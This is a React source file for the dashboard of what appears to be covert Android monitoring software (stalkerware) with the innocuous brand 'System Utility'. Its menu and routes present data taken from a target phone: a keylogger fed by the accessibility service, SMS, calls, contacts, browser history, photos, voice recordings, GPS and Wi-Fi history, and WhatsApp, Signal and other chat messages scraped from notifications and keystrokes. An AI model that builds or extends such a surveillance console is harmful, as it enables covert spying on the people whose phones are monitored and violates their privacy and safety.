import type { ReactElement, ReactNode } from "react";
import { Link, Navigate, Route, Routes, useLocation } from "react-router-dom";
import type { User } from "firebase/auth";
import { signOut } from "./auth";
import { OverviewView } from "./overview";
import { DevicesView } from "./devices";
import { ActivityView } from "./activity";
import { BatteryView } from "./battery";
import {
  ModulePage,
  CallsModule,
  MessagesModule,
  ContactsModule,
  BrowserModule,
  AppsModule,
  LocationsModule,
  MediaModule,
  KeylogModule,
  NotificationsModule,
  EventsModule,
  SocialModule,
  DeviceModule,
  WifiModule,
  KeywordsModule,
  AudioModule,
} from "./modules";

/* ---------- icons ---------- */

function Icon({ children }: { children: ReactNode }) {
  return (
    <svg viewBox="0 0 20 20" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
      {children}
    </svg>
  );
}

const I = {
  dashboard: <Icon><rect x="3" y="3" width="6" height="6" rx="1.5" /><rect x="11" y="3" width="6" height="6" rx="1.5" /><rect x="3" y="11" width="6" height="6" rx="1.5" /><rect x="11" y="11" width="6" height="6" rx="1.5" /></Icon>,
  activity: <Icon><polyline points="2.5 11 6 11 8 4.5 11 15.5 13 9 15.5 11 17.5 11" /></Icon>,
  battery: <Icon><rect x="2.5" y="7" width="13" height="7" rx="1.5" /><line x1="17.5" y1="9.5" x2="17.5" y2="11.5" /></Icon>,
  devices: <Icon><rect x="6" y="2.5" width="8" height="15" rx="2" /><line x1="8.5" y1="14.5" x2="11.5" y2="14.5" /></Icon>,
  keyboard: <Icon><rect x="2.5" y="5.5" width="15" height="9" rx="1.5" /><line x1="5" y1="9" x2="5.01" y2="9" /><line x1="8" y1="9" x2="8.01" y2="9" /><line x1="11" y1="9" x2="11.01" y2="9" /><line x1="14" y1="9" x2="14.01" y2="9" /><line x1="7" y1="11.5" x2="13" y2="11.5" /></Icon>,
  search: <Icon><circle cx="9" cy="9" r="5.5" /><line x1="13.5" y1="13.5" x2="17" y2="17" /></Icon>,
  call: <Icon><path d="M5 3h3l1.5 4-2 1.5a11 11 0 0 0 4 4L13 10l4 1.5v3a2 2 0 0 1-2.2 2A15.5 15.5 0 0 1 3 5.2 2 2 0 0 1 5 3z" /></Icon>,
  contacts: <Icon><circle cx="8" cy="7" r="3" /><path d="M2.5 16a5.5 5.5 0 0 1 11 0" /><circle cx="15" cy="8" r="2" /><path d="M14.5 13.5a4 4 0 0 1 3 2.5" /></Icon>,
  browser: <Icon><circle cx="10" cy="10" r="7" /><line x1="3" y1="10" x2="17" y2="10" /><path d="M10 3a11 11 0 0 1 0 14 11 11 0 0 1 0-14z" /></Icon>,
  apps: <Icon><rect x="3" y="3" width="4" height="4" rx="1" /><rect x="13" y="3" width="4" height="4" rx="1" /><rect x="3" y="13" width="4" height="4" rx="1" /><rect x="13" y="13" width="4" height="4" rx="1" /><line x1="7.5" y1="5" x2="12.5" y2="5" /><line x1="5" y1="7.5" x2="5" y2="12.5" /><line x1="15" y1="7.5" x2="15" y2="12.5" /></Icon>,
  events: <Icon><polygon points="10 3 12 7.5 17 8 13.5 11.5 14.5 16.5 10 13.8 5.5 16.5 6.5 11.5 3 8 8 7.5" /></Icon>,
  camera: <Icon><rect x="2.5" y="6" width="15" height="10" rx="2" /><path d="M7 6l1.5-2h3L13 6" /><circle cx="10" cy="11" r="3" /></Icon>,
  chat: <Icon><path d="M3 5.5A2.5 2.5 0 0 1 5.5 3h9A2.5 2.5 0 0 1 17 5.5v6A2.5 2.5 0 0 1 14.5 14H9l-4 3v-3H5.5A2.5 2.5 0 0 1 3 11.5z" /></Icon>,
  bell: <Icon><path d="M10 3a4 4 0 0 1 4 4c0 3 1.5 4.5 1.5 4.5h-11S6 10 6 7a4 4 0 0 1 4-4z" /><line x1="8.5" y1="15" x2="11.5" y2="15" /></Icon>,
  photos: <Icon><rect x="3" y="4" width="14" height="12" rx="2" /><circle cx="7.5" cy="8.5" r="1.5" /><path d="M3 13.5l4-4 3 3 3.5-3.5 3.5 3.5" /></Icon>,
  video: <Icon><rect x="2.5" y="5.5" width="11" height="9" rx="2" /><polygon points="14 8.5 17.5 6.5 17.5 13.5 14 11.5" /></Icon>,
  pin: <Icon><path d="M10 17.5s-5.5-4.5-5.5-9a5.5 5.5 0 0 1 11 0c0 4.5-5.5 9-5.5 9z" /><circle cx="10" cy="8.5" r="2" /></Icon>,
  wifi: <Icon><path d="M3 8a11 11 0 0 1 14 0" /><path d="M5.5 10.5a7 7 0 0 1 9 0" /><path d="M8 13a3.5 3.5 0 0 1 4 0" /><circle cx="10" cy="15.5" r="0.5" fill="currentColor" /></Icon>,
  info: <Icon><circle cx="10" cy="10" r="7" /><line x1="10" y1="9" x2="10" y2="14" /><circle cx="10" cy="6.5" r="0.5" fill="currentColor" /></Icon>,
};

/* ---------- nav structure ---------- */

type NavItem = {
  path: string;
  label: string;
  desc: string;
  icon: ReactElement;
};

type NavSection = { label: string; items: NavItem[] };

const SOCIAL_APPS: Array<{ path: string; label: string; pkg: string }> = [
  { path: "/social/whatsapp", label: "WhatsApp", pkg: "com.whatsapp" },
  { path: "/social/telegram", label: "Telegram", pkg: "org.telegram.messenger" },
  { path: "/social/messenger", label: "Messenger", pkg: "com.facebook.orca" },
  { path: "/social/instagram", label: "Instagram", pkg: "com.instagram.android" },
  { path: "/social/snapchat", label: "Snapchat", pkg: "com.snapchat.android" },
  { path: "/social/tiktok", label: "TikTok", pkg: "com.zhiliaoapp.musically" },
  { path: "/social/discord", label: "Discord", pkg: "com.discord" },
  { path: "/social/viber", label: "Viber", pkg: "com.viber.voip" },
  { path: "/social/signal", label: "Signal", pkg: "org.thoughtcrime.securesms" },
];

const NAV: NavSection[] = [
  {
    label: "Monitoring",
    items: [
      { path: "/", label: "Dashboard", desc: "Fleet at a glance", icon: I.dashboard },
      { path: "/activity", label: "Activity Timeline", desc: "Event history", icon: I.activity },
      { path: "/battery", label: "Battery", desc: "Charge history", icon: I.battery },
    ],
  },
  {
    label: "Behavior Monitoring",
    items: [
      { path: "/keylogger", label: "Keylogger", desc: "Typed text capture", icon: I.keyboard },
      { path: "/keywords", label: "Keyword Tracking", desc: "Search captured text", icon: I.search },
      { path: "/calls", label: "Calls", desc: "Call logs", icon: I.call },
      { path: "/contacts", label: "Contacts", desc: "Phonebook", icon: I.contacts },
      { path: "/browser", label: "Browser History", desc: "Visited pages", icon: I.browser },
      { path: "/apps", label: "Installed Apps", desc: "Usage stats", icon: I.apps },
      { path: "/events", label: "Events", desc: "App activity", icon: I.events },
      { path: "/screenshots", label: "Screen Capturer", desc: "Screenshots", icon: I.camera },
    ],
  },
  {
    label: "Messaging Surveillance",
    items: [
      { path: "/messages", label: "Text Messages", desc: "SMS history", icon: I.chat },
      { path: "/notifications", label: "Notifications", desc: "Push events", icon: I.bell },
    ],
  },
  {
    label: "Social Apps",
    items: SOCIAL_APPS.map((s) => ({ path: s.path, label: s.label, desc: "Messages", icon: I.chat })),
  },
  {
    label: "Multimedia Files",
    items: [
      { path: "/photos", label: "Photos", desc: "Images", icon: I.photos },
      { path: "/videos", label: "Videos", desc: "Video files", icon: I.video },
      { path: "/audio", label: "Voice Messages", desc: "Audio recordings", icon: I.video },
    ],
  },
  {
    label: "Location Tracking",
    items: [
      { path: "/locations", label: "GPS Locations", desc: "Position history", icon: I.pin },
      { path: "/wifi", label: "Wi-Fi Networks", desc: "Network info", icon: I.wifi },
    ],
  },
  {
    label: "System",
    items: [
      { path: "/devices", label: "Devices", desc: "Pair & manage", icon: I.devices },
      { path: "/device", label: "Device Info", desc: "Specifications", icon: I.info },
    ],
  },
];

const ALL_ITEMS = NAV.flatMap((s) => s.items);
const TAB_LABEL = Object.fromEntries(ALL_ITEMS.map((i) => [i.path, i.label]));

/* ---------- shell ---------- */

type BackendStatus = {
  online: boolean;
  unknown: boolean;
  version?: string;
};

function Sidebar({
  user,
  status,
  pathname,
}: {
  user: User | null;
  status: BackendStatus;
  pathname: string;
}) {
  const email = user?.email ?? user?.displayName ?? "";
  const active = (path: string) => (path === "/" ? pathname === "/" : pathname.startsWith(path));
  return (
    <aside className="sidebar">
      <div className="sidebar-brand">
        <span className="brand-mark">SU</span>
        <div className="brand-text">
          <h1>System Utility</h1>
          <p>Monitoring console</p>
        </div>
      </div>

      <nav className="sidebar-nav" aria-label="Dashboard sections">
        {NAV.map((section) => (
          <div className="nav-section" key={section.label}>
            <span className="nav-group-label">{section.label}</span>
            {section.items.map((item) => (
              <Link
                key={item.path}
                to={item.path}
                className={`nav-item ${active(item.path) ? "active" : ""}`}
              >
                <span className="nav-icon">{item.icon}</span>
                <span className="nav-text">
                  <strong>{item.label}</strong>
                  <small>{item.desc}</small>
                </span>
              </Link>
            ))}
          </div>
        ))}
      </nav>

      <div className="sidebar-footer">
        <div className={`pill ${status.online ? "pill-online" : status.unknown ? "pill-checking" : "pill-offline"}`}>
          <span className="pill-dot" />
          {status.unknown
            ? "Checking backend…"
            : status.online
              ? `Backend online · v${status.version ?? "?"}`
              : "Backend offline"}
        </div>
        {user && (
          <div className="sidebar-user">
            <span className="user-avatar">
              {user.photoURL ? (
                <img src={user.photoURL} alt="" referrerPolicy="no-referrer" />
              ) : (
                (email[0] ?? "U").toUpperCase()
              )}
            </span>
            <span className="sidebar-user-meta">
              <strong>{email}</strong>
              <button className="btn-ghost" onClick={() => void signOut()}>
                Sign out
              </button>
            </span>
          </div>
        )}
      </div>
    </aside>
  );
}

function AppRoutes({
  token,
  onTokenExpired,
}: {
  token: string | null;
  onTokenExpired?: () => void;
}) {
  return (
    <Routes>
      <Route path="/" element={<OverviewView token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/activity" element={<ActivityView token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/battery" element={<BatteryView token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/devices" element={<DevicesView token={token} onTokenExpired={onTokenExpired} />} />

      <Route
        path="/keylogger"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Keylogger"
            desc="Text typed across apps, captured by the accessibility service"
            collections={["keylog"]}
            render={(m) => <KeylogModule entries={m.keylog ?? []} />}
          />
        }
      />
      <Route
        path="/keywords"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Keyword Tracking"
            desc="Search captured text across SMS, keylogger and notifications"
            collections={["sms", "keylog", "notifications"]}
            render={(m) => <KeywordsModule entries={m} />}
          />
        }
      />
      <Route
        path="/calls"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Calls"
            desc="Call logs with number, duration and direction"
            collections={["calls"]}
            render={(m) => <CallsModule entries={m.calls ?? []} />}
          />
        }
      />
      <Route
        path="/contacts"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Contacts"
            desc="Phonebook synced from the device"
            collections={["contacts"]}
            render={(m) => <ContactsModule entries={m.contacts ?? []} />}
          />
        }
      />
      <Route
        path="/browser"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Browser History"
            desc="Pages visited in browsers on the device"
            collections={["browsing"]}
            render={(m) => <BrowserModule entries={m.browsing ?? []} />}
          />
        }
      />
      <Route
        path="/apps"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Installed Apps"
            desc="App usage — time in foreground per application"
            collections={["apps"]}
            render={(m) => <AppsModule entries={m.apps ?? []} />}
          />
        }
      />
      <Route
        path="/events"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Events"
            desc="Window and focus events captured on the device"
            collections={["events"]}
            render={(m) => <EventsModule entries={m.events ?? []} />}
          />
        }
      />
      <Route
        path="/screenshots"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Screen Capturer"
            desc="Screenshots detected in the media library"
            collections={["media"]}
            render={(m) => <MediaModule entries={m.media ?? []} kind="screenshots" />}
          />
        }
      />
      <Route
        path="/messages"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Text Messages"
            desc="SMS history with sender and content"
            collections={["sms"]}
            render={(m) => <MessagesModule entries={m.sms ?? []} />}
          />
        }
      />
      <Route
        path="/notifications"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Notifications"
            desc="Push notifications captured by the notification listener"
            collections={["notifications"]}
            render={(m) => <NotificationsModule entries={m.notifications ?? []} />}
          />
        }
      />
      <Route
        path="/photos"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Photos"
            desc="Images from the device media library"
            collections={["media"]}
            render={(m) => <MediaModule entries={m.media ?? []} kind="photos" />}
          />
        }
      />
      <Route
        path="/videos"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Videos"
            desc="Video files from the device media library"
            collections={["media"]}
            render={(m) => <MediaModule entries={m.media ?? []} kind="videos" />}
          />
        }
      />
      <Route
        path="/audio"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Voice Messages"
            desc="Audio recordings and voice notes from the device (up to 1 MB each)"
            collections={["audio"]}
            render={(m) => <AudioModule entries={m.audio ?? []} />}
          />
        }
      />
      <Route
        path="/locations"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="GPS Locations"
            desc="Position history with accuracy — tap Open in Maps to view"
            collections={["locations"]}
            render={(m) => <LocationsModule entries={m.locations ?? []} />}
          />
        }
      />
      <Route
        path="/wifi"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Wi-Fi Networks"
            desc="Connected network information over time"
            collections={["network"]}
            render={(m) => <WifiModule entries={m.network ?? []} />}
          />
        }
      />
      <Route
        path="/device"
        element={
          <ModulePage
            token={token}
            onTokenExpired={onTokenExpired}
            title="Device Info"
            desc="Device specifications as reported by the app"
            collections={["device"]}
            render={(m) => <DeviceModule entries={m.device ?? []} />}
          />
        }
      />

      {SOCIAL_APPS.map((s) => (
        <Route
          key={s.path}
          path={s.path}
          element={
            <ModulePage
              token={token}
              onTokenExpired={onTokenExpired}
              title={s.label}
              desc={`Messages and notifications from ${s.label} on the device`}
              collections={["notifications", "keylog"]}
              render={(m) => (
                <SocialModule entries={[...(m.notifications ?? []), ...(m.keylog ?? [])]} pkg={s.pkg} />
              )}
            />
          }
        />
      ))}

      <Route path="*" element={<Navigate to="/" replace />} />
    </Routes>
  );
}

export function Console({
  token,
  user,
  status,
  onTokenExpired,
}: {
  token: string | null;
  user: User | null;
  status: BackendStatus;
  onTokenExpired?: () => void;
}) {
  const location = useLocation();

  const currentLabel =
    TAB_LABEL[location.pathname] ??
    SOCIAL_APPS.find((s) => s.path === location.pathname)?.label ??
    "Dashboard";

  return (
    <div className="console">
      <Sidebar user={user} status={status} pathname={location.pathname} />
      <main className="console-main">
        <div className="console-topbar">
          <div className="console-breadcrumb">
            <span>Monitoring</span>
            <span className="crumb-sep">/</span>
            <strong>{currentLabel}</strong>
          </div>
          <span className="console-updated">
            Auto-refresh <strong>10–15s</strong> · AES-256-GCM
          </span>
        </div>
        <div className="console-content">
          <AppRoutes token={token} onTokenExpired={onTokenExpired} />
        </div>
      </main>
    </div>
  );
}
